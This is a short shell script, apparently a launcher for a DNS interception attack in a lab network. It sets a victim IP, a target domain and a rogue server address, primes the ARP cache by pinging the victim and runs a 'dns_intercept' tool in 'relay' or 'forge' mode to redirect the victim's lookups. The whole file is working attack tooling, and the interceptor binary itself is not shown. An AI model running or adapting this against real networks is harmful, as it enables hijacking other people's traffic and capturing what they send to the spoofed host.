#!/bin/sh
# Env: IFACE, VICTIM, TARGET, ROGUE, MODE (relay|forge). Optional STATIC_ROUTES.
set -e
IFACE="${IFACE:-eth0}"; VICTIM="${VICTIM:-172.16.2.10}"
TARGET="${TARGET:-example.com}"; ROGUE="${ROGUE:-172.16.1.30}"; MODE="${MODE:-relay}"
if [ -n "$STATIC_ROUTES" ]; then
    printf '%s\n' "$STATIC_ROUTES" | tr ';' '\n' | while IFS= read -r r; do
        [ -n "$r" ] && ip route replace $r 2>/dev/null || true
    done
fi
# victim MAC is read from /proc/net/arp by the interceptor; prime it:
ping -c1 -W1 "$VICTIM" >/dev/null 2>&1 || true
echo "[run-attack] mode=$MODE victim=$VICTIM target=$TARGET rogue=$ROGUE iface=$IFACE"
exec /opt/intercept/dns_intercept -i "$IFACE" -v "$VICTIM" -t "$TARGET" -r "$ROGUE" -m "$MODE"
